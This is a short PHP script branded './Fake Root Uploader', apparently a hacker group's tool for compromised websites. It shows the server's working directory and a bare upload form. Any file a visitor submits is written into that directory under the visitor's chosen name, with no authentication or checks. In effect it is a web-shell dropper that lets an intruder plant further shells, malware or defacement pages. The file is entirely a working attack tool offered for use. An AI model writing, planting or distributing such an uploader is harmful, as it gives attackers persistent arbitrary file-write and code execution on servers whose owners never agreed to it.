<?php
 {
echo '<link rel="shortcut icon" href="https://i.ibb.co/80N7zMc/1607563148-picsay.png">';
echo '<center>';
echo '<br><br><br><img height="200" src="https://i.ibb.co/pZ8WJFW/p.png"></a>
';


echo '<title>./Fake Root Uploader</title>';
echo'<body style="background-color: #272B2E; color: white;"
alink="#ee0000" link="#0000ee" vlink="#551a8b">';
echo '<center>';
echo '<br><br>';

echo '<big><span style="color: white;">'.getcwd().'</span></big><br><br>';

echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"> 
<input type="file" name="mlf"/>
<input name="upl" id="upl" type="submit" value="upload" />
</form>';
if($_POST['upl'] == "upload")
  if(@copy($_FILES['mlf']['tmp_name'], $_FILES['mlf']['name']))
{echo '<font size="2" color="white">Succes</font>';}
else
{echo '<font size="2" color="white">Failed</font>';}
echo '</body></div><br><br><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css"><center>
<i class="fa fa-envelope"></i>
<i class="fa fa-instagram"></i>
<i class="fa fa-facebook"></i>
<i class="fa fa-blog"></i><br> <br><a href="https://www.itsteamsec.my.id"><font color="red">
    exit<font color="white"> ()<font color="white">;
';
}
?>
<!DOCTYPE html>
<head>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'/>

<link type="text/css" href="http://anicrack-indo.netii.net/error.css" rel="stylesheet">
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
</head>
<html>
</body>

</html>